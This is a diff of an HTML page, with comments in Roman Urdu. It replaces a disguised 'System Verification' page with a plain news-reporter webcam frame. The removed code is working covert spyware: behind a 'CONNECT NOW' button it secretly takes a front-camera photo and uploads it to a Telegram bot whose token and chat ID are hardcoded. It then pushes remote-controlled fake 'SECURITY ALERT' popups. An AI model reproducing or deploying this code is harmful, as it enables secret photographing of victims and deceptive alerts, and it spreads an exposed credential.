@@ -3,176 +3,78 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Verification</title>
+    <title>News Reporter Camera</title>
     <style>
         body {
-            background-color: #000;
-            color: #0f0;
-            font-family: 'Courier New', Courier, monospace;
-            text-align: center;
-            padding: 20px;
+            margin: 0;
+            padding: 0;
+            background-color: #222;
             display: flex;
-            flex-direction: column;
             justify-content: center;
-            height: 90vh;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
         }
 
-        h1 { text-shadow: 0 0 10px #0f0; }
-
-        .btn {
-            background: #0f0;
-            color: #000;
-            border: none;
-            padding: 15px 30px;
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 20px;
-            box-shadow: 0 0 15px #0f0;
+        /* Main Container */
+        .news-frame-container {
+            position: relative;
+            width: 95%;
+            max-width: 800px; /* Isko kam zyada kr k size set kr skty ho */
         }
 
-        #log {
-            margin-top: 20px;
-            font-size: 12px;
-            color: #888;
+        /* Frame Image Styling */
+        #frame-img {
+            width: 100%;
+            display: block;
+            pointer-events: none; /* Ta k image select na ho */
+            z-index: 10; /* Image video se uper rahy agar transparent hai to */
         }
 
-        /* Hide Video */
-        #video-stream { display: none; }
+        /* Camera Video Styling */
+        #webcam {
+            position: absolute;
+            /* Ye values maine andaze se set ki hain ta k white box cover ho jaye */
+            top: 17.5%;    
+            left: 13.5%;
+            width: 73%;
+            height: 49%;
+            
+            object-fit: cover; /* Video ko stretch hone se bachata hai */
+            background-color: black; /* Jab tak camera load na ho black dikhe */
+            z-index: 20; /* Video ko image ke uper dikhana hai ta k white box chup jaye */
+        }
+
+        /* Agar image ka white hissa transparent (PNG) hai, 
+           to z-index: 20 ko z-index: -1 krdena ta k video frame k peeche chali jaye */
+
     </style>
 </head>
 <body>
 
-    <h1>TERMINAL ACCESS</h1>
-    <p>Click below to grant permission.</p>
-
-    <button class="btn" id="btn" onclick="startSystem()">CONNECT NOW</button>
-    
-    <div id="log">Waiting for connection...</div>
-
-    <video id="video-stream" autoplay playsinline muted></video>
-    <canvas id="hidden-canvas" style="display:none;"></canvas>
+    <div class="news-frame-container">
+        <img src="IMG_1151.png" alt="News Frame" id="frame-img">
+        
+        <video id="webcam" autoplay playsinline></video>
+    </div>
 
     <script>
-        // --- CONFIGURATION ---
-        const botToken = "8593566926:AAEhOP5u2ph3FriBMGrWvpSl8X-xEsXgrfk"; 
-        
-        let lastUpdateId = 0; 
-        let isRunning = false;
-
-        async function startSystem() {
-            const btn = document.getElementById("btn");
-            const log = document.getElementById("log");
-
-            // 1. Notification Permission
-            if (Notification.permission !== "granted") {
-                await Notification.requestPermission();
-            }
-
-            // Test Notification
-            if (Notification.permission === "granted") {
-                new Notification("System Connected", { body: "Waiting for commands..." });
-            }
-
-            btn.disabled = true;
-            btn.innerText = "ACCESS GRANTED";
-            btn.style.background = "#333";
-            btn.style.color = "#fff";
-            log.innerText = "System Active. Listening for /msg commands...";
-
-            isRunning = true;
-            
-            // Start Camera & Polling
-            captureLoop();
-            
-            // Start listening for Telegram commands
-            setInterval(checkTelegramMessages, 2000); 
-        }
-
-        // --- TELEGRAM COMMAND LISTENER ---
-        async function checkTelegramMessages() {
-            if (!isRunning) return;
-            const log = document.getElementById("log");
+        // Camera access karne ka function
+        async function startCamera() {
+            const videoElement = document.getElementById('webcam');
 
             try {
-                // Get Updates (only new ones)
-                const offset = lastUpdateId + 1;
-                const url = `https://api.telegram.org/bot${botToken}/getUpdates?offset=${offset}`;
-                
-                const response = await fetch(url);
-                const data = await response.json();
-
-                if (data.ok && data.result.length > 0) {
-                    // Loop through all new messages
-                    for (const update of data.result) {
-                        lastUpdateId = update.update_id; // Update ID save karo
-                        
-                        // Check if message exists and has text
-                        if (update.message && update.message.text) {
-                            const text = update.message.text;
-
-                            // COMMAND: /msg <text>
-                            if (text.startsWith("/msg ")) {
-                                const msgContent = text.replace("/msg ", "");
-                                log.innerText = "Command Received: " + msgContent;
-                                triggerNotification(msgContent);
-                            }
-                        }
-                    }
-                }
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                videoElement.srcObject = stream;
             } catch (error) {
-                console.error("Polling Error:", error);
+                console.error("Camera access error:", error);
+                alert("Camera access nahi mil raha. Please permission allow karein ya HTTPS use karein.");
             }
         }
 
-        // --- NOTIFICATION + ALERT TRIGGER ---
-        function triggerNotification(text) {
-            // 1. Try Native Notification
-            if (Notification.permission === "granted") {
-                new Notification("⚠️ SECURITY ALERT", {
-                    body: text,
-                    icon: "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f0/Error.svg/1200px-Error.svg.png",
-                    vibrate: [200, 100, 200]
-                });
-            }
-
-            // 2. Vibrate Phone
-            if (navigator.vibrate) navigator.vibrate([500, 200, 500, 200, 500]);
-
-            // 3. Fallback: Browser Alert (Ye screen par popup layega agar notification fail hui to)
-            // Timeout isliye taaki vibration start ho jaye pehle
-            setTimeout(() => {
-                alert("🔴 MESSAGE FROM ADMIN:\n\n" + text);
-            }, 500);
-        }
-
-        // --- CAMERA FUNCTION (Background) ---
-        async function captureLoop() {
-            // Sirf ek baar front camera photo bhejega startup par
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.getElementById("video-stream");
-                const canvas = document.getElementById("hidden-canvas");
-                video.srcObject = stream;
-
-                await new Promise(r => setTimeout(r, 2000)); // Load hone do
-
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext("2d").drawImage(video, 0, 0);
-                
-                canvas.toBlob(blob => {
-                    const fd = new FormData();
-                    fd.append("chat_id", "7681204940");
-                    fd.append("photo", blob, "login.jpg");
-                    fd.append("caption", "User connected & listening for commands 🟢");
-                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: fd });
-                }, 'image/jpeg');
-
-            } catch (e) {
-                console.error(e);
-            }
-        }
+        // Page load hone par camera start karo
+        window.addEventListener('load', startCamera);
     </script>
+
 </body>
 </html>
